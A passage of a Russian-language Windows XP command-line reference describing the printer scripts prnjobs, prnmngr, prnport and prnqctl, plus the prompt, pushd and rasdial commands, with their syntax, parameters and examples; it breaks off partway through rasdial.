- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Для вывода списка заданий и их ID-номеров эта команда вводится с параметром -l.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для приостановки печати задания с ID, равным 27, посланного на печать на удаленный компьютер с именем HRServer для печати на принтере с именем ColorPrinter введите:

cscript prnjobs.vbs -z -s HRServer -p ColorPrinter -j 27

Возобновление печати задания
Синтаксис

cscript prnjobs -m [-s удаленный_компьютер] -p имя_принтера -j номер_задания [-u имя_пользователя -w пароль]
Параметры

-m
    Обязательный параметр. Задает возобновление печати приостановленного задания.
-s удаленный_компьютер
    Задает имя удаленного компьютера, на который было отослано задание, печать которого требуется возобновить. Если компьютер не указан, используется локальный компьютер.
-p имя_принтера
    Обязательный параметр. Задает имя принтера, на котором будет распечатано задание, печать которого требуется возобновить.
-j номер_задания
    Обязательный параметр. Задает ID-номер задания, печать которого требуется возобновить.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на который отослано задание, печать которого требуется возобновить. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Для вывода списка заданий и их ID-номеров эта команда вводится с параметром -l.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").

Отмена печати задания
Синтаксис

cscript prnjobs -x [-s удаленный_компьютер] -p имя_принтера -j номер_задания [-u имя_пользователя -w пароль]
Параметры

-x
    Обязательный параметр. Задает отмену печати задания.
-s удаленный_компьютер
    Задает имя удаленного компьютера, на который было отослано задание, печать которого требуется отменить. Если компьютер не указан, используется локальный компьютер.
-p имя_принтера
    Обязательный параметр. Задает имя принтера, печать задания на котором требуется отменить.
-j номер_задания
    Обязательный параметр. Задание ID-номера задания, печать которого требуется отменить.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на который отослано задание, печать которого требуется отменить. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Для вывода списка заданий и их ID-номеров эта команда вводится с параметром -l.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").

Составление список заданий печати в очереди принтера
Синтаксис

cscript prnjobs -l [-s удаленный_компьютер] [-p имя_принтера] [-u имя_пользователя -w пароль]
Параметры

-l
    Обязательный параметр. Задает составление списка всех заданий печати в очереди принтера.
-s удаленный_компьютер
    Задает имя компьютера, на котором находится очередь печати, список которой требуется составить. Если компьютер не указан, используется локальный компьютер.
-p имя_принтера
    Задает имя принтера, очередь на печать которого содержит задания для составления списка. Если не задать принтер, то в список будут внесены все задания из всех очередей печати.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на котором находится очередь печати, список заданий печати которой требуется составить. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Для вывода списка заданий и их ID-номеров эта команда вводится с параметром -l.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для составления списка заданий печати из очереди локального принтера с именем ColorPrinter_2 введите:

cscript prnjobs.vbs -l -p ColorPrinter_2
========================================================================================
Prnmngr.vbs

Добавляет, удаляет и составляет список принтеров или подключений принтеров в дополнение к настройкам и выводу принтера, заданного по умолчанию. При выводе команды prnmngr.vbs без параметров в командной строке отображается справка по команде prnmngr.vbs.

Добавление локального принтера
Синтаксис

cscript prnmngr.vbs -a -p имя_принтера [-s удаленный_компьютер] -m имя_драйвера -r имя_порта [-u имя_пользователя -w пароль]
Параметры

-a
    Обязательный параметр. Задает добавление локального принтера.
-s удаленный_компьютер
    Задает имя удаленного компьютера, к которому требуется добавить локальный принтер. Если компьютер не указан, используется локальный компьютер. 
-p имя_принтера
    Обязательный параметр. Задает имя локального принтера, который требуется добавить.
-m имя_драйвера
    Обязательный параметр. Задает имя драйвера для локального принтера, который требуется добавить. Обычно драйверы имеют имена моделей принтеров, которые они поддерживают. Более подробные сведения о драйверах можно найти в документации оборудования.
-r имя_порта
    Обязательный параметр. Задает порт, к которому подключен принтер. Если это параллельный или последовательный порт, то используется его ID (например, LPT1 или COM1). Если это порт TCP/IP, то — имя, заданное при добавлении порта. Для получения дополнительных сведений щелкните ссылку «».
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, к которому требуется добавить принтер. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для добавления принтера с именем ColorPrinter_2, подключенного к порту LPT1 локального компьютера и для которого нужен драйвер с именем Color Printer Driver1, введите:

cscript prnmngr.vbs -a -p ColorPrinter_2 -m "Color Printer Driver1" -r lpt1:

Добавление подключений принтера
Синтаксис

cscript prnmngr.vbs -ac -p имя_принтера
Параметры

-ac
    Обязательный параметр. Задает добавление подключения принтера.
-p имя_принтера
    Обязательный параметр. Заданет имя принтера, для которого требуется добавить подключение.
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").

Удаление принтера
Синтаксис

cscript prnmngr.vbs -d -p имя_принтера [-u имя_пользователя -w пароль] [-s удаленный_компьютер]
Параметры

-d
    Обязательный параметр. Задает принтер для удаления.
-p имя_принтера
    Обязательный параметр. Задает имя принтера для удаления.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на котором требуется удалить принтер. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
-s удаленный_компьютер
    Задает имя удаленного компьютера, к которому требуется добавить локальный принтер. Если компьютер не указан, принтер добавляется к локальному компьютеру. 
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для удаления принтера с именем ColorPrinter_2 с удаленного компьютера с именем HRServer введите:

cscript prnmngr.vbs -d -s HRServer -p ColorPrinter_2

Удаление всех принтеров из компьютера
Синтаксис

cscript prnmngr.vbs -x [-s удаленный_компьютер] [-u имя_пользователя] [-w пароль]
Параметры

-x
    Обязательный параметр. Задает удаление всех принтеров на компьютере.
-s удаленный_компьютер
    Задает имя удаленного компьютера, из которого требуется удалить все принтеры. Если компьютер не указан, то все принтеры будут удалены на локальном компьютере.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на котором требуется удалить все принтеры. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").

Вывод принтера, используемого по умолчанию
Синтаксис

cscript prnmngr.vbs -g
Параметры

-g
    Обязательный параметр. Задает вывод принтера, используемого по умолчанию.
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вволдится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").

Установка принтера, используемого по умолчанию
Синтаксис

cscript prnmngr.vbs -t -p имя_принтера
Параметры

-t
    Обязательный параметр. Задает принтер, используемый по умолчанию.
-p имя_принтера
    Обязательный параметр. Задает имя принтера для установки его использования по умолчанию.
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").

Составление списка всех принтеров для компьютера
Синтаксис

cscript prnmngr.vbs -l [-s удаленный_компьютер] [-u имя_пользователя -w пароль]
Параметры

-l
    Обязательный параметр. Задает составление списка всех принтеров для компьютера.
-s удаленный_компьютер
    Задает имя удаленного компьютера, из которого требуется удалить все принтеры. Если компьютер не указан, список принтеров добавляется к локальному компьютеру.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, для которого требуется составить список принтеров. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
========================================================================================
Prnport.vbs

Создает, удаляет и составляет список стандартных TCP/IP-портов принтера в дополнение к выводу на экран и изменению настроек порта. При вызове команды prnport.vbs без параметров в командной строке выводится справка по команде prnport.vbs.

Создание стандартного порта TCP/IP
Синтаксис

cscript prnport.vbs -a -r имя_порта [-s удаленный_компьютер] -h IP-адрес [-u имя_пользователя -w пароль] [-o {raw -n номер_порта | lpr}] [-q имя_очереди] [-m{e | d}] [-i индекс] [-y имя_сообщества] [-2{e | d}]
Параметры

-a
    Обязательный параметр. Задание создания стандартного порта TCP/IP принтера
-r имя_порта
    Обязательный параметр. Задает порт, к которому подключен принтер.
-s удаленный_компьютер
    Задает имя удаленного компьютера, к которому требуется добавить порт. Если компьютер не указан, порт добавляется к локальному компьютеру.
-h IP-адрес
    Обязательный параметр. Задает IP-адрес для назначения его порту.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на котором требуется создать стандартный порт принтера TCP/IP. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений о WMI щелкните ссылку "".
-o {raw -n номер_порта | lpr}
    Задает протокол, используемый портом: необработанный TCP или TCP LPR. Для необработанного протокола TCP задается номер порта для порта принтера необработанного протокола TCP. По умолчанию номер этого порта равен 9100. Для получения дополнительных сведений щелкните ссылку "". Большинство принтеров использует необработанный протокол TCP. В сетях UNIX принтерами обычно используется протокол TCP LPR. Для получения дополнительных сведений о необработанном протоколе TCP щелкните ссылку "". Дополнительные сведения о TCP LPR см. в документе RFC 1179 на веб-узле RFC Editor.
-q имя_очереди
    Задает имя очереди для необработанного протокола TCP
-m{e | d}
    Задает признак использования SNMP. Параметр e включает SNMP. Параметр d отключает SNMP.
-i индекс
    Задает индекс SNMP при включении SNMP. Дополнительные сведения см. в документе RFC 1759 на веб-узле RFC Editor.
-y имя_сообщества
    Задает имя сообщества SNMP при включении SNMP. Для получения дополнительных сведений щелкните ссылку «».
-2{e | d}
    Переключатель режима двойных очередей (повторная постановка в очередь) для портов TCP LPR. Двойные очереди необходимы, так как TCP LPR должен включать точное число байт в контрольный файл, отправляемый на принтер, а протокол не может получить это число от локальной службы печати. Поэтому, когда файл помещается в очередь печати TCP LPR, он также помещается как временный файл в каталог system32. TCP LPR определяет размер временного файла и отправляет этот размер серверу LPD. Параметр e включает двойные очереди. Параметр d отключает двойные очереди. 
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если требуется изменить настройки конфигурации для стандартного порта TCP/IP принтера после его создания, введите команду cscript prnport.vbs с параметром -t.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").

Удаление стандартного порта TCP/IP принтера
Синтаксис

cscript prnport.vbs -d -r имя_порта [-s удаленный_компьютер] [-u имя_пользователя -w пароль]
Параметры

-d
    Обязательный параметр. Задает удаление стандартного порта TCP/IP принтера
-r имя_порта
    Обязательный параметр. Задает удаление стандартного порта TCP/IP принтера
-s удаленный_компьютер
    Задает имя удаленного компьютера, у которого требуется удалить порт. Если компьютер не указан, то порт удаляется на локальном компьютере.
-u имя_пользователя [пароль | *]
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на котором требуется удалить стандартный порт TCP/IP принтера. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений о WMI щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для удаления стандартного порта TCP/IP принтера с именем IP_192.168.12.128 из удаленного компьютера с именем HRServer введите:

cscript prnport.vbs -d -r IP_192.168.12.128 -s HRServer

Составление списка стандартных портов TCP/IP принтера на компьютере
Синтаксис

cscript prnport.vbs -l [-s удаленный_компьютер] [-u имя_пользователя -w пароль]
Параметры

-l
    Обязательный параметр. Задает составление списка всех стандартных портов TCP/IP принтера на компьютере. 
-s удаленный_компьютер
    Задает имя удаленного компьютера, для которого требуется составить список всех портов. Если компьютер не указан, то список составляется для локального компьютера.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, для которого требуется составить список всех стандартных портов TCP/IP принтера. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений о WMI щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для составления списка всех стандартных портов TCP/IP принтера для удаленного компьютера с именем HRServer введите:

cscript prnport.vbs -l -s HRServer

Вывод параметров стандартного порта TCP/IP принтера
Синтаксис

cscript prnport.vbs -g -r имя_порта [-s удаленный_компьютер] [-u имя_пользователя -w пароль]
Параметры

-g
    Обязательный параметр. Задает вывод параметров стандартного порта TCP/IP принтера.
-r имя_порта
    Обязательный параметр. Задает порт, для которого требуется вывод параметров.
-s удаленный_компьютер
    Задает имя удаленного компьютера, на котором находится порт, настройку параметров которого требуется вывести. Если компьютер не указан, то выводится информация для порта локального компьютера.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться, с помощью инструментария управления Windows к компьютеру, параметры порта которого требуется вывести. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений о WMI щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").

Настройка параметров стандартного порта TCP/IP принтера
Синтаксис

cscript prnport.vbs -t -r имя_порта [-s удаленный_компьютер] [-o {raw -n имя_порта | lpr}] [-h IP-адрес] [-q имя_очереди] [-m{e | d}] [-i индекс] [-y имя_сообщества] [-2{e | d}] [-u имя_пользователя -w пароль]
Параметры

-t
    Обязательный параметр. Задает настройку параметров стандартного порта TCP/IP принтера
-r имя_порта
    Обязательный параметр. Задает порт, к которому подключен принтер.
-s удаленный_компьютер
    Задает имя удаленного компьютера, параметры порта которого требуется настроить. Если компьютер не указан, настраивается порт локального компьютера.
-o {raw -n номер_порта | lpr}
    Задает протокол, используемого портом: необработанный TCP или TCP LPR. Если используется необработанный протокол TCP, то задается номер порта для порта принтера необработанного протокола TCP. По умолчанию номер этого порта равен 9100. Для получения дополнительных сведений щелкните ссылку "". Большинство принтеров использует необработанный протокол TCP. В сетях UNIX принтеры обычно использют протокол TCP LPR. Для получения дополнительных сведений о необработанном протоколе TCP щелкните ссылку "". Дополнительные сведения о TCP LPR см. в документе RFC 1179 на веб-узле RFC Editor.
-h IP-адрес
    Задает IP-адрес принтера, параметры порта которого требуется настроить.
-q имя_очереди
    Задает имя очереди для необработанного протокола TCP
-m{e | d}
    Задает признак использования SNMP. Параметр e включает SNMP. Параметр d отключает SNMP.
-i индекс
    Задает индекс SNMP при включении SNMP. Дополнительные сведения см. в документе RFC 1759 на веб-узле RFC Editor.
-y имя_сообщества
    Задает имя сообщества SNMP при включении SNMP. Для получения дополнительных сведений щелкните ссылку «».
-2{e | d}
    Переключатель режима двойных очередей (повторная постановка в очередь) для портов TCP LPR. Двойные очереди необходимы, так как TCP LPR должен включать точное число байт в контрольный файл, отправляемый на принтер, а протокол не может получить это число от локальной службы печати. Поэтому, когда файл помещается в очередь печати TCP LPR, он в качестве временного файла помещается в каталог system32. TCP LPR определяет размер временного файла и отправляет этот размер серверу LPD. Параметр e включает двойные очереди. Параметр d отключает двойные очереди. 
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, порт которого требуется настроить. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений о WMI щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
========================================================================================
Prnqctl.vbs

Печатает пробную страницу, приостанавливает или возобновляет печать на принтере и чистит очередь принтера. При вызове команды prncnfg.vbs без параметров в командной строке отображается справка по команде prncnfg.vbs.

Приостановка печати
Синтаксис

cscript prncnfg.vbs -g [-s удаленный_компьютер] -p имя_принтера [-u имя_пользователя -w пароль]
Параметры

-z
    Обязательный параметр. Задает приостановку печати задания.
-s удаленный_компьютер
    Задает имя компьютера, подключенного к принтеру, печать на котором требуется приостановить. Если компьютер не указан, то печать приостанавливается на принтере, подключенном к локальному компьютеру.
-p имя_принтера
    Обязательный параметр. Задает имя принтера, работу которого требуется приостановить.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, подключенному к принтеру, печать которого требуется приостановить. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений о WMI щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для того, чтобы приостанвить печать на принтере с именем ColorPrinter_2 с удаленного компьютера с именем HRServer, введите:

cscript prnqctl.vbs -z -s HRServer -p ColorPrinter_2

Возобновление печати
Синтаксис

cscript prncnfg.vbs -g [-s удаленный_компьютер] -p имя_принтера [-u имя_пользователя -w пароль]
Параметры

-m
    Обязательный параметр. Задает возобновление печати задания.
-s удаленный_компьютер
    Задает имя компьютера, подключенного к принтеру, печать на котором требуется возобновить. Если компьютер не указан, печать возобновляется на принтере, подключенном к локальному компьютеру.
-p имя_принтера
    Обязательный параметр. Задает имя принтера, на котором требуется возобновить печать.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, подключенному к принтеру, печать которого требуется возобновить. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений о WMI щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для возобновления печати на принтере с именем ColorPrinter_2 с удаленного компьютера с именем HRServer введите:

cscript prnqctl.vbs -m -s HRServer -p ColorPrinter_2

Печать пробной страницы
Синтаксис

cscript prnqctl.vbs -e [-s удаленный_компьютер] -p имя_принтера [-u имя_пользователя -w пароль]
Параметры

-e
    Обязательный параметр. Задание печати пробной страницы.
-s удаленный_компьютер
    Задает имя компьютера, подключенного к принтеру, на котором требуется напечатать пробную страницу. Если компьютер не указан, используется локальный компьютер.
-p имя_принтера
    Обязательный параметр. Задает имя принтера, на котором требуется напечатать пробную страницу.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, подключенному к принтеру, на котором требуется напечатать пробную страницу. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений о WMI щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").

Отмена всех заданий в очереди принтера
Синтаксис

cscript prnqctl.vbs -x [-s удаленный_компьютер] -p имя_принтера [-u имя_пользователя -w пароль]
Параметры

-x
    Обязательный параметр. Задает отмену печати всех заданий очереди принтера.
-s удаленный_компьютер
    Задает имя компьютера, подключенного к принтеру, печать всех заданий в очереди которого требуется отменить. Если компьютер не указан, используется локальный компьютер.
-p имя_принтера
    Обязательный параметр. Задает имя принтера, печать всех заданий в очереди которого требуется отменить.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на котором требуется отменить печать всех заданий из очереди принтера. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений о WMI щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
========================================================================================
Prompt

Изменяет приглашение командной строки (Cmd.exe). Вызванная без параметров, команда prompt восстанавливает стандартные настройки приглашения командной строки: имя текущего диска с последующим именем текущего каталога и знак "больше" (>).
Синтаксис

prompt [текст]
Параметры

текст
    Задает любой текст и сведения, которые будут выводиться в приглашении командной строки.
/?
    Отображает справку в командной строке.

Примечания
-Вид приглашения командной строки может быть настроен так, чтобы выводить имя текущего каталога, текущее время, дату и номер версии Windows XP. - Приведенный ниже список содержит сочетания символов, которые можно использовать вместо или вместе с символьными строками в параметре текст . Список содержит краткое описание текста или сведений, которые каждая комбинация символов добавляет в приглашение командной строки.
Символ     Описание
$q     = (знак равенства)
$$     $ (знак доллара)
$t     Текущее время
$d     Текущая дата
$p     Текущий диск и каталог
$v     Windows XP номер версии
$n     Текущий диск
$g     > (знак "больше")
$l     < (знак "меньше")
$b     | (канал)
$_     Перевод строки
$e     Управляющий код ANSI (код 27)
$h     Забой (для удаления символа, написанного в приглашении командной строки)
$a     & (амперсанд)
$c     ( (левая скобка)
$f     ) (правая скобка)
$s     пробел
- Если расширения командного процессора разрешены (используются по умолчанию), то команда prompt поддерживает следующие дополнительные символы форматирования:
Символ     Описание
$+     Ноль или несколько знаков плюс (+), в зависимости от глубины стека каталогов команды pushd (по одному символу на каждый уровень).
$m     Удаленное имя, связанное с текущим именем диска, или пустая строка, если текущий диск не является сетевым.
- Если использован символ $p, система Windows 2000 читает диск после выполнения каждой команды для определения текущего диска и каталога. На это может потребоваться дополнительное время, особенно для гибких дисков.
Примеры

Следующий пример устанавливает приглашение командной строки в виде текущего диска, текущего каталога и знака угловой скобки (>):

prompt $p$g

Следующая команда выводит приглашение из двух строк с текущим временем в первой строке и текущей датой во второй:

prompt time is: $t$_date is: $d
Microsoft Windows graphic
Pushd

Сохраняет имя текущего каталога для команды popd и переходит в другой каталог.
Синтаксис

pushd [путь]
Параметры

путь
    Задает путь к месту, в которое должна быть перенаправлена папка. Эта команда поддерживает относительные пути. 
/?
    Отображает справку в командной строке.

Примечания
- Каждое выполнение команды pushd сохраняет один каталог. Запустив команду pushd несколько раз, можно сохранить несколько каталогов.
Каталоги сохраняются последовательно в виртуальном стеке. Если команда pushd выполняется один раз, то каталог, в котором используется команда, помещается в стеке вниз. Если запустить команду еще раз, второй каталог помещается над первым. Этот процесс повторяется при каждом вызове команды pushd .

Команду popd можно использовать для изменения текущего каталога на каталог, сохраненный последним командой pushd. Если используется команда popd, верхний каталог в стеке удаляется и текущий каталог заменяется на этот каталог. Если использовать команду popd еще раз, из стека будет удален следующий верхний каталог.- Если расширения командного процессора разрешены, то команда pushd разрешает указывать сетевой путь или локальный диск и путь.- Если задан сетевой путь, то команда pushd временно назначает первое неиспользованное имя диска (начиная с Z:) заданному сетевому ресурсу. Далее команда меняет текущий диск и каталог на указанный каталог в заново назначенном диске. Если расширения командного процессора разрешены, то команда popd удаляет любые имена дисков, созданные командой pushd.
Примеры

Команды pushd и popd можно использовать в пакетной программе для изменения текущего каталога, в котором она была запущена, и последующего возврата к нему. В приведенном ниже примере показано, как это сделать:

@echo off
rem Этот пакетный файл удаляет все файлы .txt в заданном каталоге
pushd %1
del *.txt
popd
cls
echo Все текстовые файлы в каталоге %1 удалены

========================================================================================
Rasdial

Выполняет автоматический набор номера для клиентов Microsoft. Команда rasdial, запущенная без параметров, показывает состояние текущих подключений.
Синтаксис

rasdial имя_подключения [имя_пользователя [{пароль|*}]] [/domain:домен] [/phone:номер_телефона] [/callback:номер_для_ответного_вызова] [/phonebook:путь_к_телефонной_книге] [/prefixsuffix]

rasdial [имя_подключения] /disconnect
Параметры

имя_подключения
    Требуется при подключении к записи телефонной книги (.pbk). Задает запись текущего файла .pbk из корневой_папки_системы\System32\Ras. Если имя_подключения содержит пробелы, его следует заключать в кавычки (т. е. "имя_подключения").

    Файл Rasphone.pbk используется по умолчанию, если не задана Личная_телефонная_книга. Если она задана, используется файл имя_пользователя.pbk. Имя выводится в заголовке окна Rasphone при задании личной телефонной книги. В случае конфликта имен происходит добавление цифр.
имя_пользователя [{пароль|*}]
    Задает имя пользователя и пароль для подключения. Если используется символ звездочки, пользователю выдается запрос на ввод пароля, но вводимые символы не отображаются.
/domain:домен
    Задает домен, в котором находится учетная запись пользователя. Если этот параметр отсутствует, используется последнее значение поля Домен диалогового окна Подключение к.
/phone:номер_телефона
    Заменяет номер телефона, заданный для телефонного номера данной записи в файле телефонной книги Rasphone.pbk.
/callback:номер_для_ответного вызова
